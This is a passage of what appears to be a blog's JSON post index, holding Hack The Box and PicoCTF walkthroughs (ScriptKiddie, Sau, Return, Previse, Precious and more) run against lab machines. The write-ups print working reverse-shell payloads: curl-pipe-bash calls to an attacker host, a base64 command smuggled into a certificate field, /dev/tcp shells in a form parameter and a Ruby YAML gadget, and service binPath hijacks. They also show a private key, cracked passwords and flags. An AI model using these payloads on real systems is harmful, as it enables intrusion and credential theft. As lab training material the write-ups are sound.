zapp2HWuaSdv7s2aF3gibcz04JxGYCePRKTBy/kth9VFsAJ3eQezpwAAAMEAwaLVktNNw+sG/Erdgt1i9/vttCwVVhw9RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP96urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7PlxhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3kfO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA==-----END OPENSSH PRIVATE KEY-----Copy this and save it to file for connection on sshnvim root_id_rsachmod 600 root_id_rsassh -i root_id_rsa root@10.10.11.120root@secret:~# pwd/rootRoot Flag is: c638a7445a495db2cadf198de687e5d8***I accidentally deleted photo :(" }, { "title": "ScriptKiddie from HTB", "url": "/posts/ScriptKiddie-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "ScriptKiddie from HTBsearchsploit -m multiple/local/49491.pymodify the payload inside itcurl 10.10.16.11:8000/reverse.sh | bashTo get reverse shellpython3 49491.py[+] Manufacturing evil apkfilePayload: curl 10.10.16.11:8000/reverse.sh | bash-dname: CN='|echo Y3VybCAxMC4xMC4xNi4xMTo4MDAwL3JldmVyc2Uuc2ggfCBiYXNo | base64 -d | sh # adding: empty (stored 0%)Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=trueGenerating 2,048 bit RSA key pair and self-signed certificate (SHA384withRSA) with a validity of 90 days\tfor: CN=\"'|echo Y3VybCAxMC4xMC4xNi4xMTo4MDAwL3JldmVyc2Uuc2ggfCBiYXNo | base64 -d | sh #\"Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=truejar signed.Warning:The signer's certificate is self-signed.The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.[+] Done! apkfile is at /tmp/tmpjdd0fz2l/evil.apkDo: msfvenom -x /tmp/tmpjdd0fz2l/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/nullmv /tmp/tmpjdd0fz2l/evil.apk .then upload the file and set lhostas 127.0.0.1, OS as android then run itrlwrap nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.16.11] from (UNKNOWN) [10.10.10.226] 45002bash: cannot set terminal process group (822): Inappropriate ioctl for devicebash: no job control in this shellkid@scriptkiddie:~/html$User Flag is: 4d3a1fb5a8a198f66a10f839e04e73f6***you can do --ssh-keygen-- to get ssh connectionwe can read pwn-sfilekid@scriptkiddie:/home/pwn$ cat scanlosers.sh#!/bin/bashlog=/home/kid/logs/hackerscd /home/pwn/cat $log | cut -d' ' -f3- | sort -u | while read ip; do sh -c \"nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null\" &amp;doneif [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fiit uses hackerswhich we can edit and so we can use it to get reverse shell, so we will be pwn echo \"hah hah ;curl 10.10.16.11:8000/reverse.sh | bash\" &gt; hackersand we get shell rlwrap nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.16.11] from (UNKNOWN) [10.10.10.226] 45022bash: cannot set terminal process group (832): Inappropriate ioctl for devicebash: no job control in this shellpwn@scriptkiddie:~$we can run this with root permisionpwn@scriptkiddie:~/.ssh$ sudo -lsudo -lMatching Defaults entries for pwn on scriptkiddie: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser pwn may run the following commands on scriptkiddie: (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsolejust run it and when it turns on type /bin/bash you will get shell where you will be rootmsf6 &gt; /bin//bin/sh/bin/sh[*] exec: /bin/sh# ididuid=0(root) gid=0(root) groups=0(root)Root Flag is: 7e218aeea4cb7db6f48a0fb0342ede5b***" }, { "title": "sau from HTB", "url": "/posts/Sau-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "sau from HTBpageNmapgave this:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)| 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)|_ 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)80/tcp filtered http7080/tcp filtered empowerid8338/tcp filtered unknown19667/tcp filtered unknown34980/tcp filtered ethercat55555/tcp open unknown80 portis filtered so we can’t access it. Only open port is 55555and let’s access it.Accessing the site we see that it is a request basketsite and version is 1.2.1. Quick search shows that this version is vulnerable to ssrf. We can access the 80 portwith this vulnerability. Create basket click Open Basket Click settings logo And in Forward URLtype: 127.0.0.1:80So When we open the basket we will be forwarded to the 80 port. Check last two things: Proxy Response and Expand Forward Path Click ApplyProxy Response - This allows the basket to behave as a full proxy: responses from the underlying service configured in forward_url are passed back to clients of original requests. The configuration of basket responses is ignored in this case.Expand Forward Path - With this, the forward URL path will be expanded when original HTTP request contains a compound path.After that instead of accessing the &lt;ip&gt;:80 type &lt;ip&gt;:55555/&lt;basked id&gt;.For me it is like this: http://10.10.11.224:55555/vnjie7d Checking the site we see that it is powered by Maltrail (v0.53) After searching a bit i got to this github repositorywhich grants me an reverse shell:https://github.com/spookier/Maltrail-v0.53-Exploit/tree/main python3 exploit.py [listening_IP] [listening_PORT] [target_URL] Fill this with your IP PORT and website URLFor example: python3 exploit.py 10.10.16.2 1234 http://10.10.11.224:55555/dtfhpmh This got me Connection: rlwrap nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.2] from (UNKNOWN) [10.10.11.224] 59542$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/null$ cat /home/puma/user.txtaacebf2e57c90a4492e782dee743ff6d User Flag is: aacebf2e57c90a4492e782dee743ff6d***With root permission i can run systemctl.```bashsudo -lMatching Defaults entries for puma on sau: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin User puma may run the following commands on sau: (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.serviceCheck the version `always` because of version it is vulnerableAfter quick search i got to this site which showed me how to do `privilege escalation with systemctl`: https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7```bashsudo /usr/bin/systemctl status trail.service# after it stops typing, You need to type !sh...............................!sh# ididuid=0(root) gid=0(root) groups=0(root)# cat /root/root.txte8b95f603e7b22e2f257d5975fdd1b52Root Flag is: e8b95f603e7b22e2f257d5975fdd1b52***" }, { "title": "SansAlpha from PicoCTF", "url": "/posts/SansAlpha-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "SansAlpha from PicoCTFpage DescriptionThe Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.ssh -p 58046 ctf-player@mimas.picoctf.netUse password: 6dd28e9b HintsWhere can you get some letters?Let’s connect to machine.$ ssh -p 58046 ctf-player@mimas.picoctf.netThe authenticity of host '[mimas.picoctf.net]:58046 ([52.15.88.75]:58046)' can't be established.ED25519 key fingerprint is SHA256:n/hDgUtuTTF85Id7k2fxmHvb6rrLrACHNM6xLZ46AqQ.This host key is known by the following other names/addresses: ~/.ssh/known_hosts:33: [hashed name] ~/.ssh/known_hosts:35: [hashed name]Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '[mimas.picoctf.net]:58046' (ED25519) to the list of known hosts.ctf-player@mimas.picoctf.net's password: Permission denied, please try again.ctf-player@mimas.picoctf.net's password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1016-aws x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantageThis system has been minimized by removing packages and content that arenot required on a system that users do not log into.To restore this content, you can run the 'unminimize' command.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.SansAlpha$As said in Description we can’t use commands which contains letters (e.g. cd, pwd, ls…) From Hints i had to search linux cmd commands without letters and came with this site:tldp.org where i found commands without letters. We will be needing this in our task:? (question mark)this can represent any _single_ character. If you specified something at the command line like \"hd?\" GNU/Linux would look for hda, hdb, hdc and every other letter/number between a-z, 0-9.* (asterisk)this can represent any number of characters (including zero, in other words, zero or more characters). If you specified a \"cd*\" it would use \"cda\", \"cdrom\", \"cdrecord\" and _anything_ that starts with “cd” also including “cd” itself. \"m*l\" could by mill, mull, ml, and anything that starts with an m and ends with an l.[!]This construct is similar to the [ ] construct, except rather than matching any characters inside the brackets, it'll match any character, as long as it is not listed between the [ and ]. This is a logical NOT. For example _rm myfile[!9]_ will remove all myfiles* (ie. myfiles1, myfiles2 etc) but won't remove a file with the number 9 anywhere within it's name.. (dot)will match _any single character_, equivalent to ? (question mark) in standard wildcard expressions. Thus, \"m.a\" matches \"mpa\" and \"mea\" but not \"ma\" or \"mppa\".So let’s begin:SansAlpha$ /*bash: /bin: Is a directoryWe found our first directory.SansAlpha$ ./*bash: ./blargh: Is a directorySansAlpha$ ./*/*bash: ./blargh/flag.txt: Permission deniedWe found the flag but we do not have permission to read it. First thing i know that this flag.txt is located in ./blargh/flag.txt.If we don’t have permission to read the file maybe we can base64 encode it. so let’s search it.Using logic base64 place is /bin/base64 so let’s search it in ssh./bin/bash64 –&gt; /???/??????SansAlpha$ /???/??????/bin/base32: extra operand ‘/bin/base64’Try '/bin/base32 --help' for more information.This is because this:$ /bin/base32 /bin/base36 /bin/base64/bin/base32: extra operand ‘/bin/base64’Try '/bin/base32 --help' for more information.so we have to choose base64 with numbers and we have to execute command like this:/bin/base64 ./blargh/flag.txtIt will be like this:/???/????64 ./??????/????????When i run it i get somehing like this:SansAlpha$ /???/????64 /???/????/??????/????????/bin/base64: extra operand ‘/bin/x86_64’Try '/bin/base64 --help' for more information.we have to change something in our code so cmd will get that we are executing /bin/base64SansAlpha$ /???/???[!_]64 ./??????/????????cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV8xNDUyNTZlY30=we had to change it because system got error because of /bin/x86_64 so i used [!_] to tell terminal that do not search something that has _ in that place, so it will get that i’m using /bin/base64. After execution of the code we got the base64 of the flag.txt. Let’s decode it:$ echo \"cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV8xNDUyNTZlY30=\" | base64 -dreturn 0 picoCTF{7h15_mu171v3r53_15_m4dn355_145256ec}I got the flag and it’s:picoCTF{7h15_mu171v3r53_15_m4dn355_145256ec}***To learn the challenge you can visit this page" }, { "title": "Return from HTB", "url": "/posts/Return-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Return from HTBnmap gave thisPORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0| http-methods:|_ Potentially risky methods: TRACE|_http-title: HTB Printer Admin Panel|_http-server-header: Microsoft-IIS/10.088/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-22 20:42:37Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49671/tcp open msrpc Microsoft Windows RPC49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049675/tcp open msrpc Microsoft Windows RPC49679/tcp open msrpc Microsoft Windows RPC49682/tcp open msrpc Microsoft Windows RPC49694/tcp open msrpc Microsoft Windows RPCService Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:| 3:1:1:|_ Message signing enabled and required| smb2-time:| date: 2024-08-22T20:43:39|_ start_date: N/A|_clock-skew: 18m34sGet connection on ncfrom the site in server-addresstype your IPnc -nlvp 389Then click updateon sitenc -nvlp 389listening on [any] 389 ...connect to [10.10.16.7] from (UNKNOWN) [10.10.11.108] 583470*`%return\\svc-printer� 1edFg43012!!Then use this to connect to windowswith evil-winrmevil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'Evil-WinRM shell v3.5Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&gt;User Flag is: 69dd24b5890991f02400238c074f6268***net user svc-printerUser name svc-printerFull Name SVCPrinterComment Service Account for PrinterUser's commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 5/26/2021 1:15:13 AMPassword expires NeverPassword changeable 5/27/2021 1:15:13 AMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon 8/22/2024 1:55:54 PMLogon hours allowed AllLocal Group Memberships *Print Operators *Remote Management Use *Server OperatorsGlobal Group memberships *Domain UsersMembers of server operators group can start/stop system services. Let’s modify a service binary path to obtain a reverse shellFirst upload nc.exeon machineupload /usr/share/windows-resources/binaries/nc.exeInfo: Uploading /usr/share/windows-resources/binaries/nc.exe to C:\\Users\\svc-printer\\Documents\\nc.exeThen configure reverse shellsc.exe config vss binPath=\"C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd.exe 10.10.16.7 1234\"thensc.exe stop vsssc.exe start vssThis will give us connection no netcatThe above-obtained shell is unstable and might die after a few seconds. A more efficient way would be to obtain a meterpretershell and then quickly migrate to a more stable process.sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.7 LPORT=1337 -f exe &gt; shell.exeThen in evil-winrmupload shell.exe*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&gt; upload shell.exe*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&gt; sc.exe config vss binPath=\"C:\\Users\\svc-printer\\Document\\shell.exe\"sc.exe stop vssNow run msfconsoemsf6 &gt; use exploit/multi/handlermsf6 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcpPAYLOAD =&gt; windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set LHOST 10.10.16.7LHOST =&gt; 10.10.16.7msf6 exploit(multi/handler) &gt; set LPORT 1337LPORT =&gt; 1337msf6 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 10.10.16.7:1337Now on evil-winrmsc.exe start vssThis will give us connection on meterpreterand then we should migrate to svchost.exeprocessmeterpreter &gt; ps-------------------------- 5028 636 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\sv chost.exemeterpreter &gt; migrate 5028[*] Migrating from 4392 to 5028...[*] Migration completed successfully.Then spawn shellmeterpreter &gt; shellProcess 2616 created.Channel 1 created.Microsoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;root.txtis located at C:\\Users\\Administrator\\Desktop&gt;**Root Flag is: b534ec870c17d48af6a0e7e46c1b6b74**" }, { "title": "Previse from HTB", "url": "/posts/Previse-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Previse from HTBgobuster dir -u http://10.10.11.104/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.11.104/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: php[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.php (Status: 403) [Size: 277]/index.php (Status: 302) [Size: 2801] [--&gt; login.php]/download.php (Status: 302) [Size: 0] [--&gt; login.php]/login.php (Status: 200) [Size: 2224]/files.php (Status: 302) [Size: 4914] [--&gt; login.php]/header.php (Status: 200) [Size: 980]/nav.php (Status: 200) [Size: 1248]/footer.php (Status: 200) [Size: 217]/css (Status: 301) [Size: 310] [--&gt; http://10.10.11.104/css/]/status.php (Status: 302) [Size: 2966] [--&gt; login.php]/js (Status: 301) [Size: 309] [--&gt; http://10.10.11.104/js/]/logout.php (Status: 302) [Size: 0] [--&gt; login.php]/accounts.php (Status: 302) [Size: 3994] [--&gt; login.php]/config.php (Status: 200) [Size: 0]/logs.php (Status: 302) [Size: 0] [--&gt; login.php]then check directorieshttp://10.10.11.104/nav.php- [Home](http://10.10.11.104/index.php)- [ACCOUNTS](http://10.10.11.104/accounts.php) - [CREATE ACCOUNT](http://10.10.11.104/accounts.php)- [FILES](http://10.10.11.104/files.php)- [MANAGEMENT MENU](http://10.10.11.104/status.php) - [WEBSITE STATUS](http://10.10.11.104/status.php) - [LOG DATA](http://10.10.11.104/file_logs.php)- [](http://10.10.11.104/nav.php#)- [LOG OUT](http://10.10.11.104/logout.php)reading the create accountwith burpsuitewe see this code:&lt;section class=\"uk-section uk-section-default\"&gt; &lt;div class=\"uk-container\"&gt; &lt;h2 class=\"uk-heading-divider\"&gt;Add New Account&lt;/h2&gt; &lt;p&gt;Create new user.&lt;/p&gt; &lt;p class=\"uk-alert-danger\"&gt;ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!&lt;/p&gt; &lt;p&gt;Usernames and passwords must be between 5 and 32 characters!&lt;/p&gt; &lt;/p&gt; &lt;form role=\"form\" method=\"post\" action=\"accounts.php\"&gt; &lt;div class=\"uk-margin\"&gt; &lt;div class=\"uk-inline\"&gt; &lt;span class=\"uk-form-icon\" uk-icon=\"icon: user\"&gt;&lt;/span&gt; &lt;input type=\"text\" name=\"username\" class=\"uk-input\" id=\"username\" placeholder=\"Username\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"uk-margin\"&gt; &lt;div class=\"uk-inline\"&gt; &lt;span class=\"uk-form-icon\" uk-icon=\"icon: lock\"&gt;&lt;/span&gt; &lt;input type=\"password\" name=\"password\" class=\"uk-input\" id=\"password\" placeholder=\"Password\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"uk-margin\"&gt; &lt;div class=\"uk-inline\"&gt; &lt;span class=\"uk-form-icon\" uk-icon=\"icon: lock\"&gt;&lt;/span&gt; &lt;input type=\"password\" name=\"confirm\" class=\"uk-input\" id=\"confirm\" placeholder=\"Confirm Password\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;button type=\"submit\" name=\"submit\" class=\"uk-button uk-button-default\"&gt;CREATE USER&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/section&gt;with this we know that we can create user.or do intercept+burpsuite access /accounts.php and click do intercept &gt; response to this request and then click forward, change the header to 200 Ok. Now you can create an accountnow log inreading the backup filewhich can be downloaded in logs.phpit is vulnerable.in http://10.10.11.104/file_logs.phpuse intercpetto intercept the request done by the site to get reverse shelldelim=comma; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.7/1234 0&gt;&amp;1'url-enocdeitdelim=comma%3b+bash+-c+'bash+-i+&gt;%26+/dev/tcp/10.10.16.7/1234+0&gt;%261'on netcatrlwrap nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.16.7] from (UNKNOWN) [10.10.11.104] 47512bash: cannot set terminal process group (1596): Inappropriate ioctl for devicebash: no job control in this shellwww-data@previse:/var/www/html$nextwww-data@previse:/var/www/html$ cat config.php cat config.phpcat config.php&lt;?phpfunction connectDB(){ $host = 'localhost'; $user = 'root'; $passwd = 'mySQL_p@ssw0rd!:)'; $db = 'previse'; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon;}?&gt;now read mysql databaseswww-data@previse:/var/www/html$ mysql -u root -p'mySQL_p@ssw0rd!:)'mysql -u root -p'mySQL_p@ssw0rd!:)'mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 11Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)Copyright (c) 2000, 2021, Oracle and/or its affiliates.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; show databases;show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || previse || sys |+--------------------+5 rows in set (0.01 sec)mysql&gt; use previse;use previse;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tablesshow tables -&gt; ;;+-------------------+| Tables_in_previse |+-------------------+| accounts || files |+-------------------+2 rows in set (0.00 sec)mysql&gt; select * from accountsselect * from accounts -&gt; ;;+----+----------+------------------------------------+---------------------+| id | username | password | created_at |+----+----------+------------------------------------+---------------------+| 1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 || 2 | shavi | $1$🧂llol$qqjrakCT5usowCXCfyT0Q/ | 2024-08-31 11:09:23 |+----+----------+------------------------------------+---------------------+then crack the hash hashcat hash /usr/share/wordlists/rockyou.txt$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!Then connect to sshssh m4lwhere@10.10.11.104Warning: Permanently added '10.10.11.104' (ED25519) to the list of known hosts.Permission denied, please try again.m4lwhere@previse:~$User Flag is: 051b73c788aff39e96081dd9e81ef9c4***$ cd /tmp$ export PATH=/tmp:$PATH$ echo -ne '#!/bin/bash\\ncp /bin/bash /tmp/bash\\nchmod 4755 /tmp/bash' &gt; gzip$ chmod +x gzip$ sudo /opt/scripts/access_backup.sh$ ./bash -pnow you will be root**Root Flag is: 05ef18ad9a31dee4ca46f9316a734198**" }, { "title": "Precious from HTB", "url": "/posts/Precious-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Precious from HTBadd this to /etc/hosts10.10.11.189 precious.htbAccess the site and it’s an url to pdf. Start an python3 -n http.serverand then in enter urlplace write your http://&lt;your_ip&gt;:&lt;port&gt;and it will make an pdfon it. Download that pdfand with exiftoolread the description about it:exiftool 1891ws5e0kiv1cjadkqzjyg6wk7j41ae.pdfExifTool Version Number : 12.76File Name : 1891ws5e0kiv1cjadkqzjyg6wk7j41ae.pdfDirectory : .File Size : 20 kBFile Modification Date/Time : 2024:08:13 20:01:32+04:00File Access Date/Time : 2024:08:13 20:01:32+04:00File Inode Change Date/Time : 2024:08:13 20:01:51+04:00File Permissions : -rw-rw-r--File Type : PDFFile Type Extension : pdfMIME Type : application/pdfPDF Version : 1.4Linearized : NoPage Count : 1Creator : Generated by pdfkit v0.8.6There is an exploit on pdfkit v0.8.6 It’s an RCEattack. I found script on that in Githubrepository: https://github.com/UNICORDev/exploit-CVE-2022-25765/tree/mainpython3 exploit-CVE-2022-25765-pdfkit-0.8.5.py -s &lt;your_ip&gt; &lt;port&gt; -w http://precious.htb/ -p urlOpen netcat listenerand run the python code. you will get connection.rlwrap nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.5] from (UNKNOWN) [10.10.11.189] 39198script /dev/null -c bashScript started, output log file is '/dev/null'.ruby@precious:/var/www/pdfapp$There is two useron the machine that means we have to search for other user’s password.ls -la /home/rubytotal 28drwxr-xr-x 4 ruby ruby 4096 Aug 13 11:57 .drwxr-xr-x 4 root root 4096 Oct 26 2022 ..lrwxrwxrwx 1 root root 9 Oct 26 2022 .bash_history -&gt; /dev/null-rw-r--r-- 1 ruby ruby 220 Mar 27 2022 .bash_logout-rw-r--r-- 1 ruby ruby 3526 Mar 27 2022 .bashrcdr-xr-xr-x 2 root ruby 4096 Oct 26 2022 .bundledrwxr-xr-x 3 ruby ruby 4096 Aug 13 11:57 .cache-rw-r--r-- 1 ruby ruby 807 Mar 27 2022 .profileruby@precious:~$ cd .bundlecd .bundleruby@precious:~/.bundle$ lslsconfigruby@precious:~/.bundle$ cat configcat config---BUNDLE_HTTPS://RUBYGEMS__ORG/: \"henry:Q3c1AqGHtoI0aXAYFH\"Password for henryis : Q3c1AqGHtoI0aXAYFHSwitch to henryand read the user flag.**User Flag is: c10ea1ebfde125477e81413bfa256d5f**henry@precious:~$ sudo -lsudo -lUser henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rbThis means we can run rubywith root privileges. Read /opt/update_dependencies.rb file to get what it does.cat /opt/update_dependencies.rb# Compare installed dependencies with those specified in \"dependencies.yml\"require \"yaml\"require 'rubygems'# TODO: update versions automaticallydef update_gems()enddef list_from_file YAML.load(File.read(\"dependencies.yml\"))enddef list_local_gems Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}endgems_file = list_from_filegems_local = list_local_gemsgems_file.each do |file_name, file_version| gems_local.each do |local_name, local_version| if(file_name == local_name) if(file_version != local_version) puts \"Installed version differs from the one specified in file: \" + local_name else puts \"Installed version is equals to the one specified in file: \" + local_name end end endendThis means it reads dependencies.ymlfile where you are located.Check the rubyversion and then search for privilege escalation with that.Knowing ruby versionand that we have to write some file named dependencies.ymlit’s gonna be easy.After search i found this site where it had an reverse shellcode.https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ruby-privilege-escalation/---- !ruby/object:Gem::Installer i: x- !ruby/object:Gem::SpecFetcher i: y- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: !ruby/object:Net::BufferedIO &amp;1 io: !ruby/object:Gem::Package::TarReader::Entry &amp;1 read: 0 header: \"abc\" debug_output: !ruby/object:Net::WriteAdapter &amp;1 socket: !ruby/object:Gem::RequestSet &amp;1 sets: !ruby/object:Net::WriteAdapter socket: !ruby/module \"Kernel\" method_id: :system git_set: \"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.5/1235 0&gt;&amp;1'\" # modify this method_id: :resolveSave that to /tmp/dependencies.yml. BE SURE TO BE IN /tmp DIRECTORY Start netcatlistener and then execute this command:sudo /usr/bin/ruby /opt/update_dependencies.rbYou will get connection on netcatand you will be root.**Root Flag is: bb6cc914fbc5b2f772b198a55cafd3f9**" }, { "title": "Pixelated from PicoCTF", "url": "/posts/Pixelated-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Pixelated from PicoCTFpage DescriptionI have these 2 images, can you make a flag out of them? scrambled1.png scrambled2.pngThis is Demonstration of Visual Cryptography.this is two image which came from one image, so we need to join them together, i couldn’t find any tool to download or join this two images together so i went to github and downloaded the code.import numpy as npfrom PIL import Image# Open imagesim1 = Image.open(\"scrambled1.png\")im2 = Image.open(\"scrambled2.png\")# Make into Numpy arraysim1np = np.array(im1)im2np = np.array(im2)# Add imagesresult = im2np + im1np# Convert back to PIL image and saveImage.fromarray(result).save('result.png') Note that the images and this code should be in the same directory.Let’s run the code and see the result:Flag is:picoCTF{1b867c3e}" }, { "title": "Pitter-Patter-Platters from PicoCTF", "url": "/posts/Pitter,-Patter,-Platters-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Pitter-Patter-Platters from PicoCTFpage Description‘Suspicious’ is written all over this disk image. Download suspicious.dd.sda1If you download the file you have to upload it to autopsy and then read unallocated files to find the flag but i tried strings: $ strings -e b suspicious.dd.sda1| revThis decoded bytes into strings and then reversed it and i got the flag:picoCTF{b35t111_mL|&lt;3_ce709d16}" }, { "title": "Photon Lockdown from HTB", "url": "/posts/Photon-Lockdown-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Photon Lockdown from HTBpage DescriptionWe’ve located the adversary’s location and must now secure access to their Optical Network Terminal to disable their internet connection. Fortunately, we’ve obtained a copy of the device’s firmware, which is suspected to contain hardcoded credentials. Can you extract the password from it?Download the file and unzipit with password.Then run the filecommand to learn what type of file it is:$ file rootfs rootfs: Squashfs filesystem, little endian, version 4.0, zlib compressed, 10936182 bytes, 910 inodes, blocksize: 131072 bytes, created: Sun Oct 1 07:02:43 2023It is a squashfscompressed file. To extract files do unsquashfs:$ sudo 